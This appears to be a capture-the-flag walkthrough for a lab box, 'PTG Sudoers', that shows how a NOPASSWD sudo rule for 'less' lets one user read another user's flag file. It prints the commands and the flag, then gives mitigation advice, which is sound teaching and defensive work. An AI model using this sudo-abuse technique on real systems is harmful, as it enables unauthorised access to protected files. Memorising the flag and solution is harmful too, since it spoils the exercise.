---
title: PTG Sudoers - Linux Privilege Escalation
date: 2026-07-30 12:00:00 +0000
categories: [Walkthroughs, Linux Escalation]
tags: [linux-privesc, sudo-abuse, Linux Escalation, pt-garage]
---

![Intro Banner](/assets/img/banners/websecurity_banner_1785397298913.png)

- **Box:** PTG Sudoers
- **Vulnerability:** Sudo Abuse (`NOPASSWD` execution of `/usr/bin/less`)
- **Flag:** `ctf{!ns3cur3_sud0}`

---

## 1. Initial Recon

We are given an SSH key and an endpoint to connect to. We can connect using SSH:

```bash
ssh -i id_ecdsa user@35.239.205.196
```

## 2. Privilege Escalation Vector

Once we are in as `user`, we can check our sudo privileges by running `sudo -l`:

```bash
sudo -l
```

![Terminal Output](/assets/ptgarage/ptg_sudoers/img_2_1.png)

**Output:**
```text
Matching Defaults entries for user on 20sudoers...:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on 20sudoers...:
    (ctf : ctf) NOPASSWD: /usr/bin/less
```

We can see that we can run the command `less` as the user `ctf` without needing a password.

## 3. Exploitation

We can abuse this configuration to read the flag file, which is only readable by the user `ctf`, using the following command:

```bash
# Attempting to read it directly fails
cat flag
cat: flag: Permission denied
```

```bash
# Exploiting sudo permissions to read it as the 'ctf' user
sudo -u ctf less flag
```

![Flag Screenshot](/assets/ptgarage/ptg_sudoers/img_3_1.png)

The `less` pager opens and displays the flag:

```text
ctf{!ns3cur3_sud0}
flag (END)
```

## 4. Mitigation
- Avoid providing `NOPASSWD` sudo execution rights for utilities like `less`, `more`, `vi`, `awk`, etc., that allow reading arbitrary files or spawning interactive shells.
- If necessary, restrict the files that can be viewed using `less` in the sudoers file (e.g., `/usr/bin/less /var/log/syslog`).
